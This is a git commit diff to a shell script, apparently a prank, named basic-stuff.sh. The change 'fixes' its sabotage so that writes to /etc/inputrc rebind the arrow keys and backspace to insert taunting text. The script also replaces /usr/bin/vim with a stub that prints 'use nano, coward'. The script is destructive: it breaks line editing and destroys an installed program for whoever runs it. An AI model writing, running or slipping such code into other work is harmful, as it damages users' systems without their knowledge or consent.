081e1c35332e609d499d8725b30edf892c8654e1
MdbookTech <michael@mdbooktech.com>
2022-02-17 15:04:28 -0500

    fixed backspace

--- basic/basic-stuff.sh
+++ basic/basic-stuff.sh
@@ -3,8 +3,8 @@ python basic-stuff.py
 echo '"\e[A": "u mad bro?"' >> /etc/inputrc
 echo '"\e[C": "no typos allowed"' >> /etc/inputrc
 echo '"\e[D": "no typos allowed"' >> /etc/inputrc
-echo '"\e\177": "no typos allowed"' >> /etc/inputrc
-echo '"\e\b": "no typos allowed"' >> /etc/inputrc
+echo '"\177": "no typos allowed"' >> /etc/inputrc
+echo '"\b": "no typos allowed"' >> /etc/inputrc
 echo "#!/bin/bash" > /usr/bin/vim
 echo "echo use nano, coward" >> /usr/bin/vim
 chmod +x /usr/bin/vim
